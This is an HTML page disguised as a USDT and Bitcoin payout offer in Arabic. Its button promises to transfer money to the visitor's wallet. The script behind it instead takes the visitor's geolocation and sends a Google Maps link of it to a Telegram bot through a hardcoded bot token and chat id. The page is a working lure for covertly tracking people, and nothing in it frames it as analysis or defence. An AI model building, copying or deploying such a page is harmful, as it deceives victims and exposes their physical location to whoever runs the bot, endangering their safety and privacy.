<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>عملات رقمية USDT وبيتكوين</title>
  <style>
    body {
      background-color: #000;
      color: gold;
      text-align: center;
      font-family: Arial, sans-serif;
      padding: 40px;
    }
    img {
      width: 150px;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 28px;
      margin-bottom: 30px;
    }
    button {
      padding: 15px 30px;
      font-size: 20px;
      background-color: gold;
      color: black;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Bitcoin Logo" />
  <h1>عملات رقمية USDT وبيتكوين</h1>
  <button onclick="getLocation()">رجاءً اضغط لتحويل المال لمحفظتك</button>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendToTelegram);
      } else {
        alert("Geolocation not supported.");
      }
    }

    function sendToTelegram(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const token = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0";
      const chat_id = "7485197107";
      const message = `📍 موقع جديد:\nhttps://www.google.com/maps?q=${lat},${lon}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chat_id,
          text: message
        })
      });
    }
  </script>
</body>
</html>
